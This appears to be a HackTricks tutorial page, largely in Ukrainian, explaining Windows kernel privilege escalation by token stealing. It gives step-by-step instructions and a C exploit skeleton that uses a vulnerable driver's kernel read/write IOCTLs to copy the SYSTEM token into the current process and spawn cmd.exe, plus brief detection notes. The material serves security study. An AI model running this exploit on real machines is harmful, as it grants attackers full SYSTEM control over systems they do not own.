# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Якщо вразливий драйвер надає IOCTL, який дає атакуючому примітиви довільного kernel read і/або write, підвищення привілеїв до NT AUTHORITY\SYSTEM часто можна досягти шляхом викрадення SYSTEM access token. Техніка копіює вказівник Token з EPROCESS процесу SYSTEM у EPROCESS поточного процесу.

Чому це працює:
- Кожен процес має структуру EPROCESS, яка містить (серед інших полів) Token (фактично EX_FAST_REF до token object).
- Процес SYSTEM (PID 4) має token з усіма дозволами.
- Замінюючи EPROCESS.Token поточного процесу на вказівник SYSTEM token, поточний процес одразу починає виконуватися як SYSTEM.

> Offsets у EPROCESS відрізняються між версіями Windows. Визначайте їх динамічно (symbols) або використовуйте константи для конкретної версії. Також пам’ятайте, що EPROCESS.Token — це EX_FAST_REF (нижні 3 біти — прапорці лічильника посилань).

## Основні кроки

1) Знайти base ntoskrnl.exe і отримати адресу PsInitialSystemProcess.
- З user mode використайте NtQuerySystemInformation(SystemModuleInformation) або EnumDeviceDrivers, щоб отримати бази завантажених драйверів.
- Додайте офсет PsInitialSystemProcess (із symbols/reversing) до kernel base, щоб отримати його адресу.
2) Прочитати вказівник за PsInitialSystemProcess → це kernel pointer на EPROCESS SYSTEM.
3) З EPROCESS SYSTEM прочитати UniqueProcessId і ActiveProcessLinks offsets та пройти по двобічному зв’язаному списку структур EPROCESS (ActiveProcessLinks.Flink/Blink), доки не знайдете EPROCESS, у якого UniqueProcessId дорівнює GetCurrentProcessId(). Збережіть обидва:
- EPROCESS_SYSTEM (для SYSTEM)
- EPROCESS_SELF (для поточного процесу)
4) Прочитати системний token: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Замаскуйте нижні 3 біти: Token_SYS_masked = Token_SYS & ~0xF (звично ~0xF або ~0x7 залежно від збірки; на x64 використовуються нижні 3 біти — маска 0xFFFFFFFFFFFFFFF8).
5) Option A (common): Збережіть нижні 3 біти з вашого поточного token і приєднайте їх до вказівника SYSTEM, щоб зберегти консистентність вбудованого ref count.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Запишіть Token_NEW назад у (EPROCESS_SELF + TokenOffset) за допомогою вашого kernel write примітиву.
7) Ваш поточний процес тепер SYSTEM. За бажанням запустіть новий cmd.exe або powershell.exe для підтвердження.

## Псевдокод

Нижче наведено скелет, який використовує лише два IOCTL з вразливого драйвера: один для 8-байтового kernel read і один для 8-байтового kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Примітки:
- Зсуви: Use WinDbg’s `dt nt!_EPROCESS` with the target’s PDBs, or a runtime symbol loader, to get correct offsets. Do not hardcode blindly.
- Маска: On x64 the token is an EX_FAST_REF; low 3 bits are reference count bits. Keeping the original low bits from your token avoids immediate refcount inconsistencies.
- Стабільність: Віддавайте перевагу підвищенню привілеїв поточного процесу; якщо підвищити привілеї короткоживучого допоміжного процесу, ви можете втратити SYSTEM коли він завершиться.

## Виявлення та пом'якшення
- Завантаження непідписаних або ненадійних драйверів сторонніх розробників, які надають потужні IOCTLs, є кореневою причиною.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard та правила Attack Surface Reduction можуть запобігти завантаженню вразливих драйверів.
- EDR може спостерігати за підозрілими послідовностями IOCTL, які реалізують arbitrary read/write, а також за token swaps.

## Посилання
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
